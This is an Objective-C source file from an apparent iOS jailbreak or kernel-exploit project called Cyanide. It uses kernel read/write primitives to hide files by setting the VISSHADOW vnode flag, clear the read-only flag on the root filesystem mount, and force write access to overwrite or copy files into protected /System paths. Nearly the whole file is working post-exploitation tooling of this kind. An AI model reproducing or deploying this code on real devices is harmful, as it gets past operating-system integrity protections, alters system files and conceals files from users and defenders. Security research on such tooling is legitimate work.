//
//  file.m
//  Cyanide
//
//  Created by seo on 3/29/26.
//

#include "file.h"
#include "krw.h"
#include "offsets.h"
#include "vnode.h"
#include "kutils.h"
#include "xpaci.h"
#import "kexploit/kexploit_opa334.h"

#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <errno.h>
#include <string.h>


uint64_t hide_path(const char* path) {
    uint64_t vnode = get_vnode_for_path_by_open(path);
    if(vnode == -1) {
        printf("[%s:%d] Unable to get vnode, path: %s", __FUNCTION__, __LINE__, path);
        return -1;
    }
    
    //vnode_ref, vnode_get
    uint32_t usecount = kread32(vnode + off_vnode_v_usecount);
    uint32_t iocount = kread32(vnode + off_vnode_v_iocount);
    kwrite32(vnode + off_vnode_v_usecount, usecount + 1);
    kwrite32(vnode + off_vnode_v_iocount, iocount + 1);
    
    //hide file
    uint32_t v_flags = kread32(vnode + off_vnode_v_flag);
    kwrite32(vnode + off_vnode_v_flag, (v_flags | VISSHADOW));
    
    //restore vnode iocount, usecount
    usecount = kread32(vnode + off_vnode_v_usecount);
    iocount = kread32(vnode + off_vnode_v_iocount);
    if(usecount > 0)
        kwrite32(vnode + off_vnode_v_usecount, usecount - 1);
    if(iocount > 0)
        kwrite32(vnode + off_vnode_v_iocount, iocount - 1);

    return vnode;
}

uint64_t reveal_path_by_vnode(uint64_t vnode) {
    //vnode_ref, vnode_get
    uint32_t usecount = kread32(vnode + off_vnode_v_usecount);
    uint32_t iocount = kread32(vnode + off_vnode_v_iocount);
    kwrite32(vnode + off_vnode_v_usecount, usecount + 1);
    kwrite32(vnode + off_vnode_v_iocount, iocount + 1);
    
    //show file
    uint32_t v_flags = kread32(vnode + off_vnode_v_flag);
    kwrite32(vnode + off_vnode_v_flag, (v_flags &= ~VISSHADOW));
    
    //restore vnode iocount, usecount
    usecount = kread32(vnode + off_vnode_v_usecount);
    iocount = kread32(vnode + off_vnode_v_iocount);
    if(usecount > 0)
        kwrite32(vnode + off_vnode_v_usecount, usecount - 1);
    if(iocount > 0)
        kwrite32(vnode + off_vnode_v_iocount, iocount - 1);

    return 0;
}

// Overwrite /System/... file data
uint64_t overwrite_system_file(char* to, char* from) {

    int to_fd = open(to, O_RDONLY);
    if (to_fd == -1) return -1;
    off_t to_file_sz = lseek(to_fd, 0, SEEK_END);
    
    int from_fd = open(from, O_RDONLY);
    if (from_fd == -1) return -1;
    off_t from_file_sz = lseek(from_fd, 0, SEEK_END);
    
    if(to_file_sz < from_file_sz) {
        close(from_fd);
        close(to_fd);
        printf("[%s:%d] File size is too big to overwrite!", __FUNCTION__, __LINE__);
        return -1;
    }
    
    uint64_t proc = proc_self();
    
    // get vnode
    uint64_t fileprocPtrArr = kread64(proc + off_proc_p_fd + off_filedesc_fd_ofiles);
    fileprocPtrArr = xpaci(fileprocPtrArr);
    uint64_t to_fileproc = kread64(fileprocPtrArr + (8 * to_fd));
    uint64_t to_fp_glob = kread64(to_fileproc + off_fileproc_fp_glob);
    to_fp_glob = xpaci(to_fp_glob);
    uint64_t to_vnode = kread64(to_fp_glob + off_fileglob_fg_data);
    to_vnode = xpaci(to_vnode);
    
    // unset read-only flag on rootfs
    uint64_t rootvnode_mount = kread64(get_rootvnode() + off_vnode_v_mount);
    rootvnode_mount = xpaci(rootvnode_mount);
    uint32_t rootvnode_mnt_flag = kread32(rootvnode_mount + off_mount_mnt_flag);
    kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag & ~MNT_RDONLY);
    
    // modify open flags to make writable
    uint32_t to_fg_flag = kread32(to_fp_glob + off_fileglob_fg_flag);
    kwrite32(to_fp_glob + off_fileglob_fg_flag, to_fg_flag | FWRITE);
    
    // to modify, increasing writecount needed
    uint32_t to_vnode_v_writecount =  kread32(to_vnode + off_vnode_v_writecount);
    if(to_vnode_v_writecount <= 0) {
        kwrite32(to_vnode + off_vnode_v_writecount, to_vnode_v_writecount + 1);
    }
    
    // modify file data
    void* from_mapped = mmap(NULL, from_file_sz, PROT_READ, MAP_PRIVATE, from_fd, 0);
    if (from_mapped == MAP_FAILED) {
        perror("[-] Failed mmap (from_mapped)");
        kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag);
        close(from_fd);
        close(to_fd);
        return -1;
    }
    
    void* to_mapped = mmap(NULL, to_file_sz, PROT_READ | PROT_WRITE, MAP_SHARED, to_fd, 0);
    if (to_mapped == MAP_FAILED) {
        perror("[-] Failed mmap (to_mapped)");
        kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag);
        close(from_fd);
        close(to_fd);
        return -1;
    }

    memcpy(to_mapped, from_mapped, from_file_sz);
    msync(to_mapped, to_file_sz, MS_SYNC);
    
    munmap(from_mapped, from_file_sz);
    munmap(to_mapped, to_file_sz);
    
    // restore open flags
    kwrite32(to_fp_glob + off_fileglob_fg_flag, to_fg_flag);
    // restore rootfs mount flag
    kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag);
    
    close(from_fd);
    close(to_fd);

    return 0;
}

// Patch mount to allow write access, returns original flags
static uint32_t patch_mount_for_write(uint64_t vnode) {
    uint64_t mount = kread64(vnode + off_vnode_v_mount);
    mount = xpaci(mount);
    if (!mount || !is_kaddr_valid(mount)) return 0;

    uint32_t mnt_flag = kread32(mount + off_mount_mnt_flag);
    if (mnt_flag & MNT_RDONLY) {
        kwrite32(mount + off_mount_mnt_flag, mnt_flag & ~MNT_RDONLY);
    }
    return mnt_flag;
}

// Restore mount flags
static void restore_mount_flags(uint64_t vnode, uint32_t orig_flags) {
    if (!orig_flags) return;
    uint64_t mount = kread64(vnode + off_vnode_v_mount);
    mount = xpaci(mount);
    if (mount && is_kaddr_valid(mount)) {
        kwrite32(mount + off_mount_mnt_flag, orig_flags);
    }
}

// Copy file using kernel primitives - works on protected paths
int kernel_copy_file(const char* src_path, const char* dst_path) {
    printf("[kernel_copy] %s -> %s\n", src_path, dst_path);

    // Read source file
    int src_fd = open(src_path, O_RDONLY);
    if (src_fd == -1) {
        printf("[kernel_copy] Cannot open source: %s\n", strerror(errno));
        return -1;
    }

    off_t src_size = lseek(src_fd, 0, SEEK_END);
    lseek(src_fd, 0, SEEK_SET);

    void* src_data = mmap(NULL, src_size, PROT_READ, MAP_PRIVATE, src_fd, 0);
    close(src_fd);

    if (src_data == MAP_FAILED) {
        printf("[kernel_copy] Cannot mmap source: %s\n", strerror(errno));
        return -1;
    }

    // Get parent directory vnode and patch its mount
    NSString *dstStr = [NSString stringWithUTF8String:dst_path];
    NSString *parentDir = [dstStr stringByDeletingLastPathComponent];

    uint64_t parent_vnode = get_vnode_for_path_by_chdir(parentDir.UTF8String);
    chdir("/");

    if (parent_vnode == (uint64_t)-1 || !is_kaddr_valid(parent_vnode)) {
        printf("[kernel_copy] Cannot get parent vnode\n");
        munmap(src_data, src_size);
        return -1;
    }

    // Patch mount to allow write
    uint32_t orig_mount_flags = patch_mount_for_write(parent_vnode);
    printf("[kernel_copy] Patched mount flags: 0x%x\n", orig_mount_flags);

    // Remove existing file if any
    unlink(dst_path);

    // Try to create and write file
    int dst_fd = open(dst_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (dst_fd == -1) {
        printf("[kernel_copy] Cannot create dest: %s, trying kernel-level...\n", strerror(errno));

        // Alternative: try with direct vnode manipulation
        // First create an empty file template
        NSString *tmpPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"dylib_tmp"];
        int tmp_fd = open(tmpPath.UTF8String, O_WRONLY | O_CREAT | O_TRUNC, 0755);
        if (tmp_fd == -1) {
            printf("[kernel_copy] Cannot create temp file\n");
            restore_mount_flags(parent_vnode, orig_mount_flags);
            munmap(src_data, src_size);
            return -1;
        }

        // Write source data to temp
        write(tmp_fd, src_data, src_size);
        close(tmp_fd);

        // Now try kernel copy using vnode redirect
        // Get temp file vnode
        uint64_t tmp_vnode = get_vnode_for_path_by_open(tmpPath.UTF8String);
        if (tmp_vnode != (uint64_t)-1 && is_kaddr_valid(tmp_vnode)) {
            // Try to link/copy at kernel level
            // For now, try NSFileManager with mount patched
            NSError *err = nil;
            if ([[NSFileManager defaultManager] copyItemAtPath:tmpPath toPath:dstStr error:&err]) {
                printf("[kernel_copy] Copy via NSFileManager succeeded\n");
                unlink(tmpPath.UTF8String);
                restore_mount_flags(parent_vnode, orig_mount_flags);
                munmap(src_data, src_size);
                return 0;
            }
            printf("[kernel_copy] NSFileManager copy failed: %s\n", err.localizedDescription.UTF8String);
        }

        unlink(tmpPath.UTF8String);
        restore_mount_flags(parent_vnode, orig_mount_flags);
        munmap(src_data, src_size);
        return -1;
    }

    // File created successfully, now write data
    // Get vnode and patch for write
    uint64_t dst_vnode = get_vnode_by_fd(dst_fd);
    if (dst_vnode && is_kaddr_valid(dst_vnode)) {
        // Get fileglob and set FWRITE
        uint64_t proc = proc_self();
        uint64_t fileprocPtrArr = kread64(proc + off_proc_p_fd + off_filedesc_fd_ofiles);
        fileprocPtrArr = xpaci(fileprocPtrArr);
        uint64_t fileproc = kread64(fileprocPtrArr + (8 * dst_fd));
        uint64_t fp_glob = kread64(fileproc + off_fileproc_fp_glob);
        fp_glob = xpaci(fp_glob);

        uint32_t fg_flag = kread32(fp_glob + off_fileglob_fg_flag);
        kwrite32(fp_glob + off_fileglob_fg_flag, fg_flag | FWRITE);

        // Increase writecount
        uint32_t writecount = kread32(dst_vnode + off_vnode_v_writecount);
        if (writecount <= 0) {
            kwrite32(dst_vnode + off_vnode_v_writecount, writecount + 1);
        }
    }

    // Write data
    ssize_t written = write(dst_fd, src_data, src_size);
    int write_errno = errno;

    close(dst_fd);
    munmap(src_data, src_size);
    restore_mount_flags(parent_vnode, orig_mount_flags);

    if (written != src_size) {
        printf("[kernel_copy] Write failed: %zd/%lld, errno=%d (%s)\n",
               written, (long long)src_size, write_errno, strerror(write_errno));
        return -1;
    }

    printf("[kernel_copy] Success: %zd bytes written\n", written);
    return 0;
}

// Overwrite existing file using kernel primitives
int kernel_overwrite_file(const char* src_path, const char* dst_path) {
    printf("[kernel_overwrite] %s -> %s\n", src_path, dst_path);

    int dst_fd = open(dst_path, O_RDONLY);
    if (dst_fd == -1) {
        printf("[kernel_overwrite] Cannot open dest: %s\n", strerror(errno));
        return -1;
    }

    off_t dst_size = lseek(dst_fd, 0, SEEK_END);

    int src_fd = open(src_path, O_RDONLY);
    if (src_fd == -1) {
        close(dst_fd);
        printf("[kernel_overwrite] Cannot open source: %s\n", strerror(errno));
        return -1;
    }

    off_t src_size = lseek(src_fd, 0, SEEK_END);

    if (dst_size < src_size) {
        close(src_fd);
        close(dst_fd);
        printf("[kernel_overwrite] Dest smaller than source\n");
        return -1;
    }

    uint64_t proc = proc_self();

    // Get dest vnode
    uint64_t fileprocPtrArr = kread64(proc + off_proc_p_fd + off_filedesc_fd_ofiles);
    fileprocPtrArr = xpaci(fileprocPtrArr);
    uint64_t dst_fileproc = kread64(fileprocPtrArr + (8 * dst_fd));
    uint64_t dst_fp_glob = kread64(dst_fileproc + off_fileproc_fp_glob);
    dst_fp_glob = xpaci(dst_fp_glob);
    uint64_t dst_vnode = kread64(dst_fp_glob + off_fileglob_fg_data);
    dst_vnode = xpaci(dst_vnode);

    // Patch mount
    uint32_t orig_mount_flags = patch_mount_for_write(dst_vnode);

    // Set FWRITE flag
    uint32_t fg_flag = kread32(dst_fp_glob + off_fileglob_fg_flag);
    kwrite32(dst_fp_glob + off_fileglob_fg_flag, fg_flag | FWRITE);

    // Increase writecount
    uint32_t writecount = kread32(dst_vnode + off_vnode_v_writecount);
    if (writecount <= 0) {
        kwrite32(dst_vnode + off_vnode_v_writecount, writecount + 1);
    }

    // mmap and copy
    void* src_mapped = mmap(NULL, src_size, PROT_READ, MAP_PRIVATE, src_fd, 0);
    if (src_mapped == MAP_FAILED) {
        restore_mount_flags(dst_vnode, orig_mount_flags);
        kwrite32(dst_fp_glob + off_fileglob_fg_flag, fg_flag);
        close(src_fd);
        close(dst_fd);
        return -1;
    }

    void* dst_mapped = mmap(NULL, dst_size, PROT_READ | PROT_WRITE, MAP_SHARED, dst_fd, 0);
    if (dst_mapped == MAP_FAILED) {
        munmap(src_mapped, src_size);
        restore_mount_flags(dst_vnode, orig_mount_flags);
        kwrite32(dst_fp_glob + off_fileglob_fg_flag, fg_flag);
        close(src_fd);
        close(dst_fd);
        return -1;
    }

    memcpy(dst_mapped, src_mapped, src_size);
    msync(dst_mapped, dst_size, MS_SYNC);

    munmap(src_mapped, src_size);
    munmap(dst_mapped, dst_size);

    // Restore
    kwrite32(dst_fp_glob + off_fileglob_fg_flag, fg_flag);
    restore_mount_flags(dst_vnode, orig_mount_flags);

    close(src_fd);
    close(dst_fd);

    printf("[kernel_overwrite] Success\n");
    return 0;
}
